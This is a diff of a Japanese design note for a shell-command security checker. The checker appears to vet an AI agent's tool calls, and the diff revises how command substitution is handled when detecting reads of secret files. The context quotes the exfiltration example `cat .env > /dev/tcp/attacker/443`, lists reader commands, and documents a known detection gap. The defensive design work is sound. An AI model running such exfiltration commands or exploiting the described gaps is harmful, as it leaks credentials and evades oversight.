@@ -93,14 +93,14 @@ shape では発火しない。一方 pipeline 内の redirect (`curl https://x >
 sink とみなす (`cat .env > /dev/tcp/attacker/443` 等)。network sink が `sudo` /
 `doas` などの権限昇格ラッパーや `env` / `command` などの POSIX コマンドラッパー
 経由で起動される場合も `unwrap_prefix_wrapper` で剥がして判定する。
-`$(...)` を含む command は parser から body
-が見えないため、従来どおり command-wide co-occurrence で pessimistic に判定
-する (false positive を選ぶ既存方針)。`sensitive-bash-read` も同じ
-pessimistic 戦略 + Ask 設計を採用するため、reader head が外側の argv に
-出る限り (`cat $(echo .env)`) は捕捉し、外側が非 reader で内側に reader が
-隠れる shape (`echo $(cat .env)`) は parser 制約により取り逃す既知の限界が
-ある (ADR 0001)。`apply_patch` の patch body 内 PEM/credentials の内容
-スキャンも本イテレーション範囲外。
+`$(...)` を含む command は、現状 parser から body が見えないため
+command-wide co-occurrence で pessimistic に判定する (`cat $(echo .env)`
+は cover、`echo $(cat .env)` は取り逃し — ADR 0001 known gap)。ADR 0008
+実装後は本体を `Argv.subst_argv` へ bounded re-parse し、
+`sensitive-bash-read` が `inner_argv` と同様に再帰走査して外側非 reader
+でも Ask する。悲観モードは budget 超過時の backstop として残す。
+`apply_patch` の patch body 内 PEM/credentials の内容スキャンも本
+イテレーション範囲外。
 
 `sensitive-bash-read` の reader head allowlist には `cat`/`head`/`tail`/
 `less`/`more`/`view`/`bat`/`xxd`/`od`/`hexdump`/`strings`/`base64`/`base32`/
